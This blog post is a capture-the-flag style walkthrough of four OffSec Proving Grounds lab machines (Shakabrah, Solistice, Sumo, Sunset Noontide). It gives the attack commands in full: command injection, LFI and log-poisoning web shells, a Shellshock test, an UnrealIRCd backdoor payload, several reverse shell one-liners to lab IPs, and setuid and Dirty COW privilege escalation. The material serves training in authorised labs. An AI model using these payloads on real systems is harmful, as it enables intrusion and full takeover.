<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide" /><meta property="og:locale" content="en" /><meta name="description" content="Shakabrah" /><meta property="og:description" content="Shakabrah" /><link rel="canonical" href="https://tanishq.page/blog/posts/oscp-pg-set7/" /><meta property="og:url" content="https://tanishq.page/blog/posts/oscp-pg-set7/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta property="og:image:alt" content="PG Artwork" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-19T02:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg" /><meta name="twitter:image:alt" content="PG Artwork" /><meta property="twitter:title" content="OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-19T02:00:00-05:00","datePublished":"2021-12-19T02:00:00-05:00","description":"Shakabrah","headline":"OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide","image":{"alt":"PG Artwork","url":"https://tanishq.page/blog/assets/img/covers/pg-cover.jpeg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/oscp-pg-set7/"},"url":"https://tanishq.page/blog/posts/oscp-pg-set7/"}</script><title>OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/blog/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.min.js?baseurl=/blog&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener('DOMContentLoaded', () => { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/blog/">Tanishq Rupaal</a><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/">Home</a> </span> <span>OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1639897200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 19, 2021 </time> </span><div class="mt-3 mb-3"> <a href="/blog/assets/img/covers/pg-cover.jpeg" class="popup img-link preview-img shimmer"><img src="/blog/assets/img/covers/pg-cover.jpeg" alt="PG Artwork" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">PG Artwork</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1382 words" > <em>7 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="shakabrah"><span class="me-2">Shakabrah</span><a href="#shakabrah" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.80.86</code></p><h4 id="network-scan"><span class="me-2">Network Scan</span><a href="#network-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.80.86</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.4.29 ((Ubuntu))</table></div><h4 id="web-scan"><span class="me-2">Web Scan</span><a href="#web-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.80.86 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>index.php</ul><h3 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The webpage is basically a php file that executes ping to a given IP address and rendered the result. This is however, vulnerable to command injection. Therefore, IP addresses or domains can be appended with <code class="language-plaintext highlighter-rouge">; whoami</code> to execute the command and retrieve the result.</p><p>This is because user input is directly passed to the backend to execute and retrieve the result. This is the RCE observed. This is used to retrieve the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file which has two users of interest → <code class="language-plaintext highlighter-rouge">dylan</code> and <code class="language-plaintext highlighter-rouge">root</code>.</p><p>The RCE can also be used to take a look inside the <code class="language-plaintext highlighter-rouge">/home/</code> directory and the files inside the user <code class="language-plaintext highlighter-rouge">dylan</code>’s home were readable by <code class="language-plaintext highlighter-rouge">www-data</code> user RCE, which gives the user flag.</p><p>Further, to get a shell, the usual reverse shell one liners are used. None of them worked. Thus followed a convention to look at listening ports using <code class="language-plaintext highlighter-rouge">netstat -ntaup</code>. These ports are more likely to not be denied connections “to” since they are allowed ports on the machine for connections “from” other addresses.</p><p>The shell payload that worked was <code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1|nc 192.168.49.172 80 &gt; /tmp/f</code> with the netcat instance listening on port 80. This gave a shell as <code class="language-plaintext highlighter-rouge">www-data</code>.</p><h3 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looking at the setuid binaries in the system, an interesting one is <code class="language-plaintext highlighter-rouge">vim.basic</code> because vim allows executing shell commands.</p><p>Therefore, a shell can be lanuched by using <code class="language-plaintext highlighter-rouge">vim.basic -c ':! bash'</code> command. However, this does not set the privileges. The uid is still that of <code class="language-plaintext highlighter-rouge">www-data</code>.</p><p>This can be done by using python since it is there on the system, otherwise a C code would have to be compiled and executed. The python command can be executed as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>vim.basic <span class="nt">-c</span> <span class="s1">':py3 import os; os.setuid(0); os.system("/bin/bash")'</span>
</pre></table></code></div></div><p>This gives the root shell and thus the root flag.</p><hr /><h2 id="solistice"><span class="me-2">Solistice</span><a href="#solistice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-1"><span class="me-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.124.72</code></p><h4 id="network-scan-1"><span class="me-2">Network Scan</span><a href="#network-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.124.72</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>21<td>FTP<td>pyftpdlib 1.5.6<tr><td>22<td>SSH<td>OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<tr><td>25<td>SMTP<td>Exim smtpd<tr><td>80<td>HTTP<td>Apache httpd 2.4.38 ((Debian))<tr><td>2121<td>FTP<td>pyftpdlib 1.5.6 → <em>Anonymous Login Allowed</em><tr><td>3128<td>HTTP Proxy<td>Squid http proxy 4.6<tr><td>8593<td>HTTP<td>PHP cli server 5.5 or later (PHP 7.3.14-1) → <em>PHPSESSID HTTPOnly flag not set</em><tr><td>54787<td>HTTP<td>PHP cli server 5.5 or later (PHP 7.3.14-1)<tr><td>62524<td>-<td>-</table></div><h4 id="web-scan-1"><span class="me-2">Web Scan</span><a href="#web-scan-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.124.72 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php</code></p><p>Nothing interesting was revealed in any of the ports.</p><h3 id="exploitation-1"><span class="me-2">Exploitation</span><a href="#exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="lfi"><span class="me-2">LFI</span><a href="#lfi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The web server running at port 8593 has the ability to list books via PHP. This is done via a get parameter. Trying LFI with <code class="language-plaintext highlighter-rouge">../../../../../../etc/passwd</code> confirms LFI and gives the result of the file to list possible users which includes <code class="language-plaintext highlighter-rouge">www-data</code>, <code class="language-plaintext highlighter-rouge">miguel</code> and <code class="language-plaintext highlighter-rouge">root</code>.</p><h4 id="transition-lfi-to-apache-log-poisoning"><span class="me-2">Transition LFI to Apache log poisoning</span><a href="#transition-lfi-to-apache-log-poisoning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The default apache error logs are located at <code class="language-plaintext highlighter-rouge">/var/log/apache2/error.log</code>. This is readable on the browser because of the LFI vulnerability. Therefore, adding php code to an attempt would add it to the error log and subsequently render it on the webpage.</p><p>Therefore visiting the url <code class="language-plaintext highlighter-rouge">http://192.168.124.72/&lt;?php system($_GET['cmd']);?&gt;</code> should add it to the error log, thereby giving an RCE for the get request parameter in the LFI url. The access via the browser encodes the special characters, therefore a burp repeater request modification should do the trick.</p><h4 id="exploiting-the-rce"><span class="me-2">Exploiting the RCE</span><a href="#exploiting-the-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>With the php payload injected into the access log, the lfi url can be modified to add the parameter value for the <code class="language-plaintext highlighter-rouge">cmd</code> variable. Testing with <code class="language-plaintext highlighter-rouge">id</code> works. Next, this can used to test if nc, wget, etc. exist on the system which can be used to create a shell payload. This is the RCE on the server.</p><p>Both netcat and bash shell exist, therefore sending a payload <code class="language-plaintext highlighter-rouge">nc -e /bin/bash 192.168.49.124 3002</code> with a listener active on the local machine gives a shell with the user <code class="language-plaintext highlighter-rouge">www-data</code>.</p><h3 id="privilege-escalation-1"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looking at the setuid files and directories using <code class="language-plaintext highlighter-rouge">find / -perm -u=s 2&gt;/dev/null</code>, there is a server running at <code class="language-plaintext highlighter-rouge">/var/tmp/sv</code> which is a directory that is owned by <code class="language-plaintext highlighter-rouge">root</code> and is world-writable.</p><p>This has an <code class="language-plaintext highlighter-rouge">index.php</code> file which just prints that the site is under construction. This cannot be observed from any of the ports enumerated above. Checked the status of this under processes using <code class="language-plaintext highlighter-rouge">ps aux | grep root | grep sv</code>. This confirms that the server is actually running, but on localhost only. Therefore, this php file can be edited to have a payload that connects back to the attacker machine to get a reverse shell. Due to the permissions, this would be the root shell.</p><p>The pentest monkey reverse shell is uploaded to the server and the contents of the <code class="language-plaintext highlighter-rouge">index.php</code> file are overwritten with them. Then the execution can be done as follows on the low privileged shell → <code class="language-plaintext highlighter-rouge">curl http://localhost:57/index.php</code></p><p>This gives a shell as the <code class="language-plaintext highlighter-rouge">root</code> user and thus the root flag as well.</p><hr /><h2 id="sumo"><span class="me-2">Sumo</span><a href="#sumo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-2"><span class="me-2">Enumeration</span><a href="#enumeration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.101.87</code></p><h4 id="network-scan-2"><span class="me-2">Network Scan</span><a href="#network-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -A -Pn -p- -T4 -o nmap.txt 192.168.101.87</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>22<td>SSH<td>OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)<tr><td>80<td>HTTP<td>Apache httpd 2.2.22 ((Ubuntu))</table></div><h4 id="web-scan-2"><span class="me-2">Web Scan</span><a href="#web-scan-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>GoBuster scan → <code class="language-plaintext highlighter-rouge">gobuster dir -u http://192.168.101.87 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt</code></p><p>Directories/files listed →</p><ul><li>index.html<li>cgi-bin/ (403)<li>icons/ (403)<li>doc/ (403)</ul><h3 id="exploitation-2"><span class="me-2">Exploitation</span><a href="#exploitation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The <code class="language-plaintext highlighter-rouge">cgi-bin/</code> directory looked suspicious. Generally in the past, cgi-bins used to be executed by bash directly and were vulnerable to shellshock. There is however a 403 on the directory. Running it through gobuster again tells the existence of <code class="language-plaintext highlighter-rouge">test</code> under that directory. Navigating to it shows that it is the default cgi-bin for the server.</p><p>The test for vulnerability for shellshock can be done as follows → <code class="language-plaintext highlighter-rouge">curl -H "My-Header: () { :; }; echo; /usr/bin/id" http://192.168.101.87/cgi-bin/test</code>. If this returns a valid result, then the server is vulnerable.</p><p>It was found that the server was in fact vulnerable. Therefore, used this as an RCE to get a reverse shell using the following payload → <code class="language-plaintext highlighter-rouge">/bin/bash -i &gt;&amp; /dev/tcp/192.168.49.101/3002 0&gt;&amp;1</code>.</p><p>This gave a shell as the user <code class="language-plaintext highlighter-rouge">www-data</code> and subsequently the user flag.</p><h3 id="privilege-escalation-2"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looked at the kernel version which is 3.2.0-23-generic. This is very outdated. The OS version is Ubuntu 12.04. The machine is also 64 bit. Looking at results of searchsploit, dirty cow is an exploit that would fit the scenario.</p><p>There are 4 kinds of dirty cow, the one used for this machine is <code class="language-plaintext highlighter-rouge">'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd method)</code>. Compiling the exploit and sending the binary via wget allows setting a new user with root permissions.</p><p>Then, logging in with the newly created user gives the root shell and subseqeuntly the root flag.</p><hr /><h2 id="sunset-noontide"><span class="me-2">Sunset Noontide</span><a href="#sunset-noontide" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-3"><span class="me-2">Enumeration</span><a href="#enumeration-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Machine IP → <code class="language-plaintext highlighter-rouge">192.168.56.120</code></p><h4 id="network-scan-3"><span class="me-2">Network Scan</span><a href="#network-scan-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Nmap scan → <code class="language-plaintext highlighter-rouge">nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.56.120</code></p><p>OS Detection → <code class="language-plaintext highlighter-rouge">Host: irc.foonet.com</code></p><div class="table-wrapper"><table><thead><tr><th><strong>Port</strong><th><strong>Service</strong><th><strong>Other details (if any)</strong><tbody><tr><td>6667, 6697, 8067<td>IRC<td>UnrealIRCd</table></div><h3 id="exploitation-3"><span class="me-2">Exploitation</span><a href="#exploitation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The only service is an IRC, so searched exploit db via searchsploit for an exploit. This returned 4 entries. Looking at the code for the first one, there seems to be a backdoor which allows execution of shell commands when anything start with <code class="language-plaintext highlighter-rouge">AB;</code>.</p><p>Therefore, access can be checked by connecting to the IRCd via netcat and sending the the payload as <code class="language-plaintext highlighter-rouge">AB;echo "a" | nc 192.168.49.56 3002</code>. With a listener active on the attacking machine with the IP as in the payload, a conection and the letter “a” would be received.</p><p>Therefore, a similar payload can be used to receive shell via nc → <code class="language-plaintext highlighter-rouge">AB;nc 192.168.49.56 3002 -e /bin/bash</code>. This gives a shell as the <code class="language-plaintext highlighter-rouge">server</code> user. The home directory has the user flag.</p><h3 id="privilege-escalation-3"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With the shell of the <code class="language-plaintext highlighter-rouge">server</code> user, trying default creds of <code class="language-plaintext highlighter-rouge">root:root</code> works for getting the shell to root. This gives the root flag.</p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/offsec-proving-grounds/">OffSec Proving Grounds</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/offsec-proving-grounds/" class="post-tag no-text-decoration" >offsec-proving-grounds</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OffSec%20PG%20-%20Shakabrah,%20Solistice,%20Sumo,%20Sunset%20Noontide%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set7%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OffSec%20PG%20-%20Shakabrah,%20Solistice,%20Sumo,%20Sunset%20Noontide%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set7%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set7%2F&text=OffSec%20PG%20-%20Shakabrah,%20Solistice,%20Sumo,%20Sunset%20Noontide%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set7%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/gha-notif/">Custom GitHub WebHook Notifications via GitHub Actions</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-npm/">Reverse Proxy in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/go-coding/">The Way to Go(lang)</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-budgetlord/">Expense Tracking in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-fusion/">Leantime in Home Lab</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/oscp-pg-set6/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Potato, PyExp, Sar, Seppukku</h4><div class="text-muted"><p>Potato Enumeration Machine IP → 192.168.53.101 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.53.101 OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set5/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</h4><div class="text-muted"><p>NoName Enumeration Machine IP → 192.168.225.15 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.15 OS Detection → os_info Port Service Other de...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set4/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Katana, Lampiao, Loly, Monitoring</h4><div class="text-muted"><p>Katana Enumeration Machine IP → 192.168.51.83 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.51.83 OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a 